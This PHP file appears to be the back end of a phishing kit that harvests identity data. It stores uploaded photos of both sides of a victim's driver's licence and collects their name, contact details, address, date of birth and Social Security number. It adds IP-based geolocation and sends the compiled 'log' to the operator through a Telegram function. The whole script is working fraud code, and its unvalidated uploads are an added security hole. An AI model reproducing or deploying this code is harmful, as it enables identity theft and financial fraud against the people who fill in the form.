<?php
// require telgram api
require('./config.php');
// change url to your own 
$Uurl = $_SERVER['HTTP_HOST'].'./uploads';
$target_dir = "uploads/";
$fronty = $target_dir . time() . basename($_FILES["licensefront"]["name"]);
move_uploaded_file($_FILES["licensefront"]["tmp_name"], $fronty);
$backy = $target_dir . time() . basename($_FILES["licenseback"]["name"]);
move_uploaded_file($_FILES["licenseback"]["tmp_name"], $backy);

//Create an instance; passing `true` enables exceptions

// get ip
$ip = $_SERVER['REMOTE_ADDR'];
$ip_info = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));
// Information

$GoodBoyIp = $ip;
$GoodBoyCountry = $ip_info->geoplugin_countryName;
$GoodBoyCity = $ip_info->geoplugin_city;
$GoodBoyLat = $ip_info->geoplugin_latitude;
$GoodBoyLong = $ip_info->geoplugin_longitude;
$GoodBoyCurrency = $ip_info->geoplugin_currencyCode;


$body = "Log from " . $GoodBoyDestination . "\n";
$body .= "Fisrt name :" . $_POST['first-name'] . "\n";
$body .= " Last name :" . $_POST['lastname'] . "\n";
$body .= "----------------------------------------\n";
$body .= "phone :" . $_POST['phone'] . "\n";

$body .= "email :" . $_POST['email'] . "\n";

$body .= "address :" . $_POST['address'] . "\n";

$body .= "DOB :" . $_POST['date'] . "\n";

$body .= "country :" . $_POST['country'] . "\n";

$body .= "zip :" . $_POST['zip'] . "\n";

$body .= "city :" . $_POST['city'] . "\n";

$body .= "state :" . $_POST['state'] . "\n";

$body .= "SSN :" . $_POST['SSN'] . "\n";
$body .= "ID type:" . $_POST['ID'] . "\n";

$body .= "Ip :" . $GoodBoyIp . "\n";

$body .= "country :" . $GoodBoyCountry . "\n";

$body .= "city :" . $GoodBoyCity . "\n";
$body .= "----------------------------------------\n";

$body .= "latitude :" . $GoodBoyLat . "\n";

$body .= "Longitude :" . $GoodBoyLong . "\n";

$body .= "The currency :" . $GoodBoyCurrency . "\n";
$body .= "----------------------------------------\n";
$body .= "The front license : " . $Uurl . "/" . $fronty . "\n";
$body .= "The back back licence : " . $Uurl . "/" . $backy . "\n";

$texted = strip_tags($body);
send_telegram_msg($texted);

return 1;
